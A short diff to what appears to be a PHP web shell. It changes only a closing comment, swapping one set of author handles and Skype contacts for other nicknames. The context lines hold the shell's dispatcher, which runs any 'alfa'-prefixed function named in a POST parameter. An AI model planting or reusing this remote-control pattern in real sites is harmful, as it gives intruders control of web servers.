@@ -6193,8 +6193,8 @@ if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
 /*
-#Persian Gulf For Ever
-#skype : sole.sad
-#skype : ehsan.invisible
+#NSL_programming
+#Eichmann_Arashps
+#Rich
 */
 ?>
